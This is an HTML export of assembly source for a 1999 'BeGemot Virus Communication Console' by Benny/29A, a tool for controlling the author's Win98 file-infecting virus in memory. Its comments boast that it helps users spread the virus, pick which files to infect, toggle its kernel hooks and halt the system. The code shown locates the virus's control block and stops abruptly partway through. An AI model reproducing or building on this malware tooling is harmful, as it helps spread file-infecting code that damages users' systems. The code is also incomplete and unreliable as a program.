<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;                                                     млллллм млллллм млллллм</span><span class="sc0">
</span><span class="sc1">;   кФ BeGemot Virus Communication Console ФП         ллл ллл ллл ллл ллл ллл</span><span class="sc0">
</span><span class="sc1">;   Г                   by                  Г          мммллп плллллл ллллллл</span><span class="sc0">
</span><span class="sc1">;   РФФФФФФФФФФФФФ Benny / 29A ФФФФФФФФФФФФФй         лллмммм ммммллл ллл ллл</span><span class="sc0">
</span><span class="sc1">;                                                     ллллллл ллллллп ллл ллл</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Hello everybody,</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;let me introduce BGVCC, interface which will allow u to communicate with my</span><span class="sc0">
</span><span class="sc1">;Win98.BeGemot virus (see its description). Yeah, this is the first try to </span><span class="sc0">
</span><span class="sc1">;create comm. interface for any virus ever. By this utility u can easily</span><span class="sc0">
</span><span class="sc1">;control all virus actions, which BeGemot does. Bah, u can do many things</span><span class="sc0">
</span><span class="sc1">;with this. BGVCC is only 8192 bytes !!! Just read.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;After execution, BGVCC will try to find base address of BeGemot Control Block.</span><span class="sc0">
</span><span class="sc1">;If BGCB won't be found, BGVCC will quit with error. Otherwise it will</span><span class="sc0">
</span><span class="sc1">;remember base address, print prompt and wait for your commands. U can write</span><span class="sc0">
</span><span class="sc1">;commands by typin' numbers from '0' to '9' or pressin' ESCape key.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Command list:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               ESC     -       Quits BGVCC.</span><span class="sc0">
</span><span class="sc1">;               '0'     -       BGVCC will show ya, if BGCB is present or not.</span><span class="sc0">
</span><span class="sc1">;               '1'     -       BGVCC will show ya, what BG actualy does.</span><span class="sc0">
</span><span class="sc1">;               '2'     -       U can disable all virus activities in memory</span><span class="sc0">
</span><span class="sc1">;                               by this command.</span><span class="sc0">
</span><span class="sc1">;               '3'     -       U can enable all virus activities in memory,</span><span class="sc0">
</span><span class="sc1">;                               previously disabled, by this command.</span><span class="sc0">
</span><span class="sc1">;               '4'     -       BGVCC will show you sleep time value. Sleep</span><span class="sc0">
</span><span class="sc1">;                               time is time, how long will be thread suspended,</span><span class="sc0">
</span><span class="sc1">;                               i.e. how long won't be commited CPU time to</span><span class="sc0">
</span><span class="sc1">;                               thread.</span><span class="sc0">
</span><span class="sc1">;               '5'     -       By this command u can increase sleep time.</span><span class="sc0">
</span><span class="sc1">;               '6'     -       By this command u can decrease sleep time.</span><span class="sc0">
</span><span class="sc1">;               '7'     -       This command will switch unit for increasin'</span><span class="sc0">
</span><span class="sc1">;                               and decreasin' sleep time to 100 or 1000</span><span class="sc0">
</span><span class="sc1">;                               miliseconds.</span><span class="sc0">
</span><span class="sc1">;               '8'     -       By this u can totaly halt system. Why?</span><span class="sc0">
</span><span class="sc1">;                               Why not? X-D</span><span class="sc0">
</span><span class="sc1">;               '9'     -       Last command is useful too. This will erase</span><span class="sc0">
</span><span class="sc1">;                               BGCB from memory and suspend thread for actual</span><span class="sc0">
</span><span class="sc1">;                               session. After this it won't be able to</span><span class="sc0">
</span><span class="sc1">;                               connect to BGCB again (only after restart).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;If BGVCC will get to freeze state, press Ctrl+C or Ctrl+Break to quit.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Well, why did I code this ? It's easy. It helped me with testin' my virus.</span><span class="sc0">
</span><span class="sc1">;Now, in the final version, u can control all virus activities. U can easily</span><span class="sc0">
</span><span class="sc1">;spread out BeGemot virus, u can also control, which files will be infected</span><span class="sc0">
</span><span class="sc1">;and which not. If u will experiment with this, u will find many of these</span><span class="sc0">
</span><span class="sc1">;features useful. Heh, but why would u do that ? X-DDD</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Benny/29A (c) 1999. Enjoy!</span><span class="sc0">



</span><span class="sc2">.386p</span><span class="sc0">                                           </span><span class="sc1">;386 protected mode opcodes</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">                                     </span><span class="sc1">;flat model (32bit offset)</span><span class="sc0">
                                                </span><span class="sc1">;no segment</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">                            </span><span class="sc1">;some include file</span><span class="sc0">


</span><span class="sc5">BGCB_Signature</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00</span><span class="sc0">                      </span><span class="sc1">;some equates</span><span class="sc0">
</span><span class="sc5">BGCB_New</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">
</span><span class="sc5">BGCB_ID</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc0">
</span><span class="sc5">BGCB_Data</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">

</span><span class="sc5">BG_IDLE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;virus state</span><span class="sc0">
</span><span class="sc5">BG_INFECTINEXEC</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">BG_INFECTINRAR</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">BG_STEALTHIN</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">AllocConsole</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">                         </span><span class="sc1">;API functions</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetConsoleTitleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetStdHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetConsoleCursorInfo</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WriteConsoleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ReadConsoleInputA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">PeekConsoleInputA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">


</span><span class="sc1">;data section</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
    </span><span class="sc5">ConTitle</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'[BGVCC] - BeGemot Virus Comunication Console by Benny/29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">msgStart</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- Performin'' search for base adress of [BGCB].'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'  This can take a while. Please wait...'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgStartSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">msgStart</span><span class="sc0">

    </span><span class="sc5">msgError</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- Base address not found, [BGCB] isn''t present at memory.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'  Press [ESC] key to quit...'</span><span class="sc0">
    </span><span class="sc5">msgErrorSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">msgError</span><span class="sc0">

    </span><span class="sc5">msgOK</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- Base address found at '</span><span class="sc0">
    </span><span class="sc5">w_hex</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'00000000h.'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgOKSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">msgOK</span><span class="sc0">

    </span><span class="sc5">msgCheck</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [BGVCC] is now checkin'' [BGCB] memory presency...'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgCheckSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">msgCheck</span><span class="sc0">

    </span><span class="sc5">msgFOut</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [BG] is '</span><span class="sc0">
    </span><span class="sc5">msgCOutSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgFOut</span><span class="sc0">
    </span><span class="sc5">@id</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'                     '</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgFOutSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgFOut</span><span class="sc0">
    </span><span class="sc5">idSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">@id</span><span class="sc0">

    </span><span class="sc5">msgAction</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [BGVCC] is now checkin'' [BG]''s state...'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgActionSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgAction</span><span class="sc0">

    </span><span class="sc5">msgKill</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [BG] will now halt system. R u sure, u wanna do this? [Y/N]'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgKillSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgKill</span><span class="sc0">

    </span><span class="sc5">msgKilled</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'ФФФ&gt; C Ya In Da HeLl!'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgKilledSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgKilled</span><span class="sc0">

    </span><span class="sc5">msgDisable</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [BG] will now unhook kernel calls, all replication actions will be disabled.'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'  R u sure u wanna do this? [Y/N]'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgDisableSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgDisable</span><span class="sc0">

    </span><span class="sc5">msgDisabled</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [BG] is now unhooked of all kernel calls.'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgDisabledSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgDisabled</span><span class="sc0">

    </span><span class="sc5">msgEnable</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [BG] will now hook kernel calls, all replication actions will be enabled.'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'  R u sure u wanna do this? [Y/N]'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgEnableSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgEnable</span><span class="sc0">

    </span><span class="sc5">msgEnabled</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [BG] is now hooked to all kernel calls.'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgEnabledSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgEnabled</span><span class="sc0">

    </span><span class="sc5">msgDisc</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [ATTENTION] Connection will be canceled. It won''t be possible to connect'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'  later! Proceed? [Y/N]'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgDiscSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgDisc</span><span class="sc0">

    </span><span class="sc5">msgGTime</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [BGVCC] is now checkin'' [BG]''s sleep time...'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgGTimeSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgGTime</span><span class="sc0">

    </span><span class="sc5">msgGTime2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [BG]''s sleep time is '</span><span class="sc0">
    </span><span class="sc5">curTime</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'00000000h miliseconds (default 3E8h = 1 second).'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgGTime2Size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgGTime2</span><span class="sc0">

    </span><span class="sc5">msgITime</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [BGVCC] is increasin'' sleep time of [BG]...'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgITimeSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgITime</span><span class="sc0">

    </span><span class="sc5">msgDTime</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [BGVCC] is decreasin'' sleep time of [BG]...'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgDTimeSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgDTime</span><span class="sc0">

    </span><span class="sc5">msgSUnit</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- Unit for changin'' sleep time is now '</span><span class="sc0">
    </span><span class="sc5">sUnitVal</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'100 '</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgSUnitSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgSUnit</span><span class="sc0">

    </span><span class="sc5">msgWait</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'-'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'- [BGVCC] is now waitin'' for your commands. Press ID number or [ESC] key...'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">msgWaitSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">msgWait</span><span class="sc0">

        </span><span class="sc1">;Virus states</span><span class="sc0">
    </span><span class="sc5">idPresent</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'PrEsEnT              '</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">idnPresent</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'NoT-PrEsEnT          '</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">idIdle</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'IdLe                 '</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">idInfEXE</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'InFeCtIn'' ExEcUtAbLe '</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">idInfRAR</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'InFeCtIn'' RAR        '</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">idStealth</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'StEaLtHiN''           '</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">idError</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'UnKnOwN AcTiOn'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

        </span><span class="sc5">cursor</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;console cursor</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">bAddress</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">80000000h</span><span class="sc0">       </span><span class="sc1">;startin address</span><span class="sc0">
        </span><span class="sc5">sUnit</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">100</span><span class="sc0">             </span><span class="sc1">;unit for changin sleep time</span><span class="sc0">
        </span><span class="sc5">bckAddress</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;jump address used in SEH</span><span class="sc0">
        </span><span class="sc5">handle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;standard output</span><span class="sc0">
        </span><span class="sc5">temp</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;temporary</span><span class="sc0">
        </span><span class="sc5">inputEvent</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;input event</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">                                           </span><span class="sc1">;code section</span><span class="sc0">
</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;code begin here</span><span class="sc0">
</span><span class="sc5">SEH_hndlr</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">                                 </span><span class="sc1">;macro for SEH</span><span class="sc0">
        </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">                        </span><span class="sc1">;remove SEH frame</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">         </span><span class="sc1">;explore next page (next 4096 bytes)</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bckAddress</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;continue execution</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AllocConsole</span><span class="sc0">                       </span><span class="sc1">;create console window</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ConTitle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetConsoleTitleA</span><span class="sc0">                   </span><span class="sc1">;set console title</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">11</span><span class="sc0">                     
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetStdHandle</span><span class="sc0">                       </span><span class="sc1">;get standard output</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;save it</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cursor</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetConsoleCursorInfo</span><span class="sc0">               </span><span class="sc1">;disable console cursor</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgStartSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgStart</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;display message</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bckAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bck</span><span class="sc0">            </span><span class="sc1">;set jump address</span><span class="sc0">
</span><span class="sc5">bck</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SEH_hndlr</span><span class="sc4">&gt;</span><span class="sc0">             </span><span class="sc1">;setup SEH frame</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bAddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;get address</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0">                     </span><span class="sc1">;is it limit?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">not_found</span><span class="sc0">                            </span><span class="sc1">;yeah, print message and quit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.BGCB_Signature</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'BCGB'</span><span class="sc0">        </span><span class="sc1">;check signature</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_BGCB</span><span class="sc0">                            </span><span class="sc1">;baaaad</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.BGCB_New</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;next check</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">got_BGCB</span><span class="sc0">                             </span><span class="sc1">;got address</span><span class="sc0">

</span><span class="sc5">not_BGCB</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;incorrect address, cause GP</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">;fault and so jump to SEH</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;handler</span><span class="sc0">
</span><span class="sc5">not_found</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;address not found</span><span class="sc0">
        </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">                        </span><span class="sc1">;remove SEH frame</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgErrorSize</span><span class="sc0">      
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgError</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;display message</span><span class="sc0">
</span><span class="sc5">e_error</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetChar</span><span class="sc0">                            </span><span class="sc1">;get key</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">27</span><span class="sc0">                              </span><span class="sc1">;wait for ESC (27)</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">e_error</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                  </span><span class="sc1">;set error code</span><span class="sc0">
